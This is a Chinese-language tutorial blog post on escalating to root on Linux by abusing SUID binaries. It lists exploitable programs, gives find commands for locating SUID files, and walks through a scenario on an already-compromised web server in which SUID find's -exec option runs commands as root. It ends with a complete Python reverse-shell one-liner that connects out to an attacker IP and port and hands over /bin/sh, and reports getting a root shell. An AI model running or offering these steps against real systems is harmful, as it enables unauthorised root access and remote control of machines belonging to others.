关于SUID详细：[Linux下的用户、组和权限](https://blog.csdn.net/qq_36119192/article/details/82228791#Umask%E3%80%81Suid%E3%80%81Sgid%E3%80%81%E7%B2%98%E6%BB%9E%E4%BD%8D)

SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID[提权](https://so.csdn.net/so/search?q=%E6%8F%90%E6%9D%83&spm=1001.2101.3001.7020)的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。

已知的可用来提权的linux可行性的文件列表如下：

*   nmap
*   vim
*   find
*   bash
*   more
*   less
*   nano
*   cp

以下命令可以发现系统上运行的所有SUID可执行文件。

```
#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试      
find / -perm -u=s -type f 2>/dev/null      
find / -user root -perm -4000-print2>/dev/null      
find / -user root -perm -4000-exec ls -ldb {} \;
```


### 利用find文件提权

假如我们现在拿到了一个网站服务器的shell，但是权限是ubuntu，我们现在需要提权到 root 用户权限。

![](https://img-blog.csdnimg.cn/20181207144515533.png)

 我们查看具有root用户权限的SUID文件

```
find / -perm -u=s -type f 2>/dev/null
```


![](https://img-blog.csdnimg.cn/20181207144921887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们随便找一个命令进行利用，我们就找find，先查看其信息，发现其确实是root用户权限的SUID的文件

![](https://img-blog.csdnimg.cn/20181207145134999.png)

我们先看一下是否能用find命令以root权限运行，发现确实可以以root权限运行

```
/usr/bin/find examples.desktop -exec whoami \;
```


![](https://img-blog.csdnimg.cn/20181207145711258.png)

然后我们查看目标网站上是否有python环境，可以看到有python2.7.6的环境

![](https://img-blog.csdnimg.cn/20181207145303369.png)

于是我们以root用户的身份利用python反弹shell，

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.25",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  #反弹一个sh类型的shell
```


![](https://img-blog.csdnimg.cn/20181207151357201.png)

可以看到，在攻击端收到了反弹过来的shell，并且是root身份

![](https://img-blog.csdnimg.cn/20181207151426917.png)

文章知识点与官方知识档案匹配，可进一步学习相关知识

[CS入门技能树](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[Linux入门](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)[初识Linux](https://edu.csdn.net/skill/gml/gml-1c31834f07b04bcc9c5dff5baaa6680c)10973 人正在系统学习中